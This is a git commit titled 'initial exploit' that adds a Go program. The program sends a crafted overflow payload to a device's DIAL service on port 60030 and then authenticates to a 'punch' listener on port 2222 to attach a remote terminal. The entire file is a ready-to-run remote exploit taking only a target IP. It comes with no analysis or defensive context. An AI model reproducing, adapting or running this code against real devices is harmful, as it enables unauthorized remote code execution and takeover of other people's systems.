71e2d083a529fbfc8d7d7a9ddc84a7335b991d81
Carl-Fredrik Sundstrom <carl.f.sundstrom@gmail.com>
2024-09-26 17:36:47 +0700

    Create main.go
    initial exploit

---
+++ main.go
@@ -0,0 +1,71 @@
+package main
+
+import (
+	"fmt"
+	"net"
+	"os"
+	"time"
+)
+
+func main() {
+	// Ensure IP address is passed as an argument
+	if len(os.Args) != 2 {
+		fmt.Println("Usage: go run main.go <IP_ADDRESS>")
+		return
+	}
+	ipAddress := os.Args[1]
+
+	// First payload
+	fmt.Println("Sending first payload to trigger the exploit...")
+	err := sendFirstPayload(ipAddress)
+	if err != nil {
+		fmt.Printf("Error sending first payload: %v\n", err)
+		return
+	}
+
+	// Wait for a moment before sending the second payload
+	fmt.Println("Waiting for the 'punch' binary to be ready on port 2222...")
+	time.Sleep(5 * time.Second) // Adjust the wait time as necessary
+
+	// Second payload
+	fmt.Println("Sending second payload to authenticate and attach terminal...")
+	err = sendSecondPayload(ipAddress)
+	if err != nil {
+		fmt.Printf("Error sending second payload: %v\n", err)
+		return
+	}
+
+	fmt.Println("Payloads sent successfully!")
+}
+
+func sendFirstPayload(ip string) error {
+	// The first payload string that triggers the exploit
+	firstPayload := "POST /dial_srv/apps/qwertyuioppoMMMMHHHHLLLLOOOOPPPPiiiiiiiiCCCCDDDDRRRR\xc5\x26\x05\x28\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xa3\xe3\x09\x28\xff\xff\xff\xff\xff\xff\xff\xff\xfc\x0e\x62\x35\xff\xff\xff\xff\x0d\x1f\x06\x28\x8b\xf1\x0a\x28\xc5\x1f\x10\x28\xb7\x32\x10\x28\xed\x4c\x12\x28\x9c\xd7\x10\x28\x1c\x9e\x11\x28\xff\xff\xff\xff\x7b\xf8\x0e\x28\xfc\x0e\x62\x35\xa9\xc2\x0f\x28\xff\xff\xff\xff\xff\xff\xff\xff\x41\x8d\x08\x28\x93\x70\x0f\x28\xff\xff\xff\xff\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xb1\xc2\x0f\x28\xa9\xc2\x0f\x28\xd3\x7a\x10\x28\x23\x6d\x6f\x75\x6e\x74\x25\x31\x24\x73\x2f\x64\x65\x76\x2f\x73\x64\x61\x31\x25\x31\x24\x73\x2f\x6d\x6e\x74\x2f\x75\x73\x62\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x25\x32\x24\x6c\x63\x23\x23\xa9\xde\x07\x28 HTTP/1.1\r\nHost: " + ip + ":60030\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+
+	// Connect to the IP on port 60030
+	conn, err := net.Dial("tcp", ip+":60030")
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+
+	// Send the first payload
+	_, err = conn.Write([]byte(firstPayload))
+	return err
+}
+
+func sendSecondPayload(ip string) error {
+	// The second payload string that sends the magic key for punch authentication
+	secondPayload := "\x9f\xbe\x9b\x17\x3b\x18\xee\x01\x82\xea\x35\x9f\xa7\x60\x12\x4c\n\0\0\0\0\0\n\n"
+
+	// Connect to the IP on port 2222 (where punch binary is listening)
+	conn, err := net.Dial("tcp", ip+":2222")
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+
+	// Send the second payload
+	_, err = conn.Write([]byte(secondPayload))
+	return err
+}
